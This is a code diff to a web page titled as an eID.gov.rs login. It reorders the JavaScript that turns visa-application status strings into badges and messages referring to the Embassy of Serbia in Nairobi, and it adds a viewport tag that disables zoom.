@@ -2,6 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <title>Login � eID.gov.rs | Republic of Serbia</title>
 <style>
@@ -653,9 +654,9 @@ function getSrbStepInfo(step, cancelled, cancelReason) {
   if (s.indexOf("approve") !== -1) return { state: 3, cls: "final", badge: "VISA APPROVED", desc: "Your visa has been approved! Please contact the Embassy of Serbia in Nairobi for collection instructions." };
   if (s.indexOf("decision") !== -1) return { state: 2, cls: "review", badge: "DECISION MADE", desc: "A decision has been made on your application. Please check your email for the official notification with next steps." };
   if (s.indexOf("ready") !== -1 || s.indexOf("collection") !== -1 || s.indexOf("couriered") !== -1) return { state: 3, cls: "final", badge: "READY FOR COLLECTION", desc: "Your passport with the visa outcome is ready for collection at the Embassy of Serbia or has been dispatched." };
-  if (s.indexOf("confirm") !== -1 || s.indexOf("documents") !== -1) return { state: 2, cls: "review", badge: "UNDER REVIEW", desc: "Your documents have been confirmed. Your application is now under substantive review by the Ministry of Foreign Affairs." };
   if (s.indexOf("reject") !== -1 || s.indexOf("denied") !== -1) return { state: 3, cls: "final", badge: "REJECTED", desc: "Your visa application has been rejected. Please check the official notification for reasons and appeal options." };
-  if (s.indexOf("process") !== -1 || s.indexOf("review") !== -1) return { state: 1, cls: "verification", badge: "UNDER VERIFICATION", desc: "Your application is being processed and verified by the consular section of the Embassy of Serbia." };
+  if (s.indexOf("checking") !== -1 || s.indexOf("re-submit") !== -1 || s.indexOf("process") !== -1 || s.indexOf("review") !== -1) return { state: 1, cls: "verification", badge: "UNDER VERIFICATION", desc: "Your application is being processed and verified by the consular section of the Embassy of Serbia." };
+  if (s.indexOf("confirm") !== -1 || s.indexOf("documents") !== -1) return { state: 2, cls: "review", badge: "UNDER REVIEW", desc: "Your documents have been confirmed. Your application is now under substantive review by the Ministry of Foreign Affairs." };
   if (s.indexOf("pending") !== -1 || s.indexOf("submitted") !== -1) return { state: 0, cls: "submitted", badge: "SUBMITTED", desc: "Your application has been submitted to the Ministry of Foreign Affairs of the Republic of Serbia and is awaiting processing." };
   if (s.indexOf("cancelled") !== -1 || s.indexOf("cancel") !== -1) return { state: 3, cls: "final", badge: "CANCELLED", desc: "Cancelled. " + (cancelReason || "") };
   return { state: 0, cls: "submitted", badge: step || "SUBMITTED", desc: "Status: " + (step || "Submitted") };
